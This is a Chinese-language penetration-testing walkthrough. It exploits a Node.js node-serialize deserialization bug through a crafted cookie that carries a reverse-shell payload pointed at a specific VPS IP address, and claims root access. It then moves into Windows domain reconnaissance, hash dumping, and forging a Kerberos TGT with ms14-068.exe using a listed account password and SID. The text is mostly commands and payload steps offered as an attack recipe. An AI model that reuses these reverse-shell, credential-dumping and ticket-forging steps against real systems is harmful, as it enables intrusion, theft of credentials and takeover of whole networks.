Node.js反序列化漏洞利用


1）目标站点

2）BP拦截抓包

3） 选择cookie值并将其发送到Decoder模块进行解密

4）利用原理

    这个易受攻击的Web应用程序的漏洞在于，它从HTTP请求的cookie中读取profile的值，执行base64解码后传递给unserialize()函数。由于cookie是不可信的输入，可以通过精心构建的恶意cookie值来利用这个漏洞。


5）利用Nodejs Security Toolkit创建反方向shell playload，先确认下自己VPS的地址 ，然后执行命令

python nodejsshell.py 39.96.69.62 444

生成反向shell payload：

6）使用JavaScript代码来生成序列化的payload

var y = {    rce : function() {}    }    var serialize = require(‘node-serialize’);    console.log(“Serialized: \n” + serialize.serialize(y));d

7）将文件另存为exploit.js并使用node命令“node exploit.js”执行，将生成最终序列化的payload

8）VPS启监听

9）将7步骤中的代码粘贴到Textarea中解码成字符串。解码之前，在函数体后面加上IIFE圆括号()：对字符串进行base64编码，然后在Cookie标头值中使用经编码的payload向web服务器发出请求。

10）成功监听、获得出网服务器root权限

域信息收集


1）拿下104后根据收集的信息发现是一个域环境，收集一波信息先

注：先理一下思路

    域渗透思路：通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域或者其他方法搞出管理员密码（添加域管理员），进而拿下域控制器、渗透整个内网。

a）域信息收集，一般DNS服务器或者时间服务器就是域控，根据收集的信息确认bypass.cn为域控

2）查询域管理员

3）hashdum 获取hash值

4）systeminfo查看打了那些补丁,没打补丁的漏洞就可以针对性的利用

6）查看所有域用户

net user /domain

7）查看域控制器

wmic ntdomain list brief

8）域控制器主机名

net group "domain controllers" /domain，注意通过该指令得到的机器名后面会多一个$符号，WIN-HH2JKDUHI2K$    //这个域控主机名

2）生成 TGT：用于伪造

ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址 ms14-068.exe -u sam@bypass.cn -p cb32d37aSenven -s S-1-5-21-360744819-2609297478-1733207496-1000 -d 192.168.1.101

先查看你是否有域管权限   dir \\主机名\c$  能访问即拥有域管权限
